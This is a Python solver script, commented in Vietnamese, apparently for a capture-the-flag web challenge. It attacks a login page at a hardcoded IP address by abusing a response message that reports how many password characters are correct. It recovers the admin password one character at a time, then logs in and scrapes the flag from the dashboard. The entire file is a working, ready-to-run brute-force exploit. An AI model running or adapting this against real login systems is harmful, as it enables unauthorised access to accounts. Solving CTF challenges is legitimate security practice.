import requests
import string
import re
from urllib.parse import urljoin

# Cấu hình
BASE_URL = "http://52.59.124.14:5015/"
LOGIN_URL = urljoin(BASE_URL, 'login.php')
DASHBOARD_URL = urljoin(BASE_URL, 'dashboard.php')
USERNAME = "admin"
MAX_PASSWORD_LENGTH = 16

# Bộ ký tự để thử, bao gồm cả ký tự đặc biệt đã tìm thấy.
CHARSET = string.ascii_letters + string.digits + string.punctuation + " " + "£§°©®™€¥¢"

def get_flag(session: requests.Session) -> str:
    """
    Sau khi đăng nhập, truy cập dashboard và lấy flag từ note.
    """
    print("\n[*] Đăng nhập thành công. Đang truy cập dashboard để lấy flag...")
    try:
        response = session.get(DASHBOARD_URL)
        response.raise_for_status()
        
        # Sử dụng regex để trích xuất nội dung từ thẻ textarea
        match = re.search(r'<textarea name="note">(.*?)</textarea>', response.text, re.DOTALL)
        if match:
            flag = match.group(1).strip()
            return flag
        else:
            return "Không tìm thấy flag trong dashboard."
            
    except requests.RequestException as e:
        return f"Lỗi khi truy cập dashboard: {e}"

def solve_ctf():
    """
    Khai thác lỗ hổng, tìm mật khẩu, đăng nhập và lấy flag.
    """
    known_password = ""
    session = requests.Session()

    print(f"[*] Bắt đầu tấn công brute-force vào tài khoản '{USERNAME}'...")

    while len(known_password) < MAX_PASSWORD_LENGTH:
        found_char_in_iteration = False
        for char in CHARSET:
            test_password = known_password + char
            
            print(f"\r[*] Đang thử mật khẩu: {test_password.ljust(MAX_PASSWORD_LENGTH)}", end="", flush=True)

            # Gửi yêu cầu đăng nhập
            # allow_redirects=False để bắt được redirect tới dashboard.php
            response = session.post(LOGIN_URL, data={
                'username': USERNAME,
                'password': test_password
            }, allow_redirects=False)

            # Kiểm tra nếu đăng nhập thành công (redirect tới dashboard)
            if response.status_code == 302 and 'dashboard.php' in response.headers.get('Location', ''):
                known_password = test_password
                print(f"\n[+] Tìm thấy mật khẩu đầy đủ: {known_password}")
                flag = get_flag(session)
                print(f"\n[+] FLAG: {flag}")
                return

            # Phân tích phản hồi để tìm số ký tự đúng
            # Cần lấy lại trang index để đọc flash message
            index_page = session.get(BASE_URL)
            match = re.search(r"you got (\d+) characters correct!", index_page.text)
            if match:
                correct_chars = int(match.group(1))
                
                if correct_chars > len(known_password):
                    known_password += char
                    found_char_in_iteration = True
                    break
        
        if not found_char_in_iteration:
            print("\n[*] Không tìm thấy ký tự tiếp theo. Dừng lại.")
            break

    print("\n[*] Hoàn tất quá trình tấn công nhưng không thể đăng nhập.")

if __name__ == "__main__":
    solve_ctf()